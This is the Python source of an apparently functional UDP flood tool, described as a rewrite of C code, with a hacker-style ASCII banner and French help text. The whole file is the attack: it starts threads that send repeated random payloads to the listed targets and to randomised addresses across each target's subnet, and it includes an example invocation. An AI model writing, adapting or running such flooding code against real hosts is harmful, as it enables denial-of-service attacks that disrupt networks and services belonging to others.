import socket
import random
import struct
import time
import threading
import argparse
import colorama
from colorama import *


def rand_str(length):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

def randomize_ip(base_ip, netmask):
    base_int = struct.unpack("!I", socket.inet_aton(base_ip))[0]
    random_part = random.randint(0, (1 << (32 - netmask)) - 1)
    randomized_ip = struct.pack("!I", base_int + random_part)
    return socket.inet_ntoa(randomized_ip)

def flood_udpbypass(targets, source_port, dest_port, payload_size, random_payload, repeat, csleep, netmask):
    sockets = []
    payload = rand_str(payload_size) if not random_payload else None


    for target in targets:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("", source_port))
        sockets.append((sock, target))


    def worker(sock, target):
        nonlocal payload
        target_ip, target_port = target
        for _ in range(repeat):
            if random_payload:
                payload = rand_str(random.randint(10, payload_size))
            try:
                randomized_ip = randomize_ip(target_ip, netmask)
                target_addr = (randomized_ip, target_port)
                sock.sendto(payload.encode(), target_addr)
            except OSError as e:
                print(f"Error sending to {target_ip}: {e}")
            if csleep > 0:
                time.sleep(csleep / 1000)


    threads = []
    for sock, target in sockets:
        thread = threading.Thread(target=worker, args=(sock, target))
        threads.append(thread)
        thread.start()


    for thread in threads:
        thread.join()


if __name__ == "__main__":
    banner  =  r"""
        _nnnn_
        dGGGGMMb    
       @p~qp~~qMb       Author : Minatsuki.eth / x86
       M|@||@) M|       Rewritten C to Python
       @,----.JM|
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMP|   .'
     `-'       `--' hjm
    """
    print(Fore.LIGHTRED_EX+banner)
    print("Exemple : python3 udp_b.py --targets 192.168.1.10:80 192.168.1.20:443 --dest_port 80 --payload_size 1024 --random_payload --repeat 20 --csleep 50 --netmask 24")
    parser = argparse.ArgumentParser(description="UDP-Flooder Rewritten ")
    parser.add_argument("--targets", nargs='+', required=True, help="Liste des cibles au format IP:PORT (ex: 192.168.1.10:80)")
    parser.add_argument("--source_port", type=int, default=random.randint(1024, 65535), help="Port source utilisé (par défaut, un port aléatoire).")
    parser.add_argument("--dest_port", type=int, required=True, help="Port de destination.")
    parser.add_argument("--payload_size", type=int, default=512, help="Taille du payload (par défaut : 512).")
    parser.add_argument("--random_payload", action="store_true", help="Activer la génération aléatoire des payloads.")
    parser.add_argument("--repeat", type=int, default=10, help="Nombre de répétitions par cible (par défaut : 10).")
    parser.add_argument("--csleep", type=int, default=100, help="Pause entre les envois en ms (par défaut : 100).")
    parser.add_argument("--netmask", type=int, default=24, help="Sous-réseau cible (par défaut : 24).")


    args = parser.parse_args()


    targets = []
    for target in args.targets:
        try:
            ip, port = target.split(":")
            targets.append((ip, int(port)))
        except ValueError:
            print(f"Format de cible invalide : {target}. Utilisez IP:PORT.")
            exit(1)

    flood_udpbypass(
        targets=targets,
        source_port=args.source_port,
        dest_port=args.dest_port,
        payload_size=args.payload_size,
        random_payload=args.random_payload,
        repeat=args.repeat,
        csleep=args.csleep,
        netmask=args.netmask
    )
